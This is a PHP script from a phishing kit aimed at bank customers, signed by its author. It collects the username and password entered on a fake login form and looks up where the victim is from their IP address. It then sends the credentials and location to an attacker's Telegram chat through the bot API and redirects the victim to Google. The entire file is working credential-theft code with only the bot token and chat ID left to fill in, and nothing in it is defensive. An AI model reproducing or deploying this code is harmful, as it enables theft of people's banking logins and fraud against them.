<?php

// Enable error reporting for debugging
error_reporting(E_ALL);
ini_set('display_errors', 1);

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Get the username and password from the POST request
    $username = isset($_POST['username']) ? $_POST['username'] : '';
    $password = isset($_POST['password']) ? $_POST['password'] : '';
    $bank = isset($_GET['bank']) ? $_GET['bank'] : 'Unknown';

    // Check if the username and password are provided
    if (empty($username) || empty($password)) {
        echo json_encode(['success' => false, 'message' => 'Username or password missing']);
        exit;
    }

    // Get the visitor's IP address and location
    $ip = getenv("REMOTE_ADDR");
    $locationData = get_location($ip);

    // Format the message
    $message = "---------------📦📦📦📦📦--------------\n";
    $message .= "Us3rn@me📛📛 : " . $username . "\n";
    $message .= "Pa33w0rd🔑🔑: " . $password . "\n";
    $message .= "-------------------------------------\n";
    $message .= "IP 📍: " . $ip . "\n";
    $message .= "City 🏙️: " . $locationData['city'] . "\n";
    $message .= "Region 🏞️: " . $locationData['region'] . "\n";
    $message .= "Country 🌍: " . $locationData['country'] . "\n";
    $message .= "------Coded By 9mamba ----------\n";

    // Telegram bot token and chat ID
    $botToken = "your_bot_id"; // Replace with your bot token
    $chatId = "your_chat_id"; // Replace with your chat ID

    // Send message to Telegram
    sendToTelegram($chatId, $message, $botToken);

    // Redirect to google.com after processing
    header("Location: https://www.google.com");
    exit;
}

// Function to get visitor's location information
function get_location($ip)
{
    // Call the geoplugin.net API for location data
    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=" . $ip));

    if ($ip_data && $ip_data->geoplugin_countryName != null) {
        return [
            'city' => $ip_data->geoplugin_city,
            'region' => $ip_data->geoplugin_regionName,
            'country' => $ip_data->geoplugin_countryName
        ];
    }

    return [
        'city' => 'Unknown',
        'region' => 'Unknown',
        'country' => 'Unknown'
    ];
}

// Function to send a message to Telegram
function sendToTelegram($chatId, $message, $botToken)
{
    $url = "https://api.telegram.org/bot$botToken/sendMessage";
    $postData = [
        'chat_id' => $chatId,
        'text' => $message
    ];

    $options = [
        'http' => [
            'header' => "Content-Type: application/x-www-form-urlencoded\r\n",
            'method' => 'POST',
            'content' => http_build_query($postData),
        ],
    ];

    $context = stream_context_create($options);
    file_get_contents($url, false, $context);
}

?>
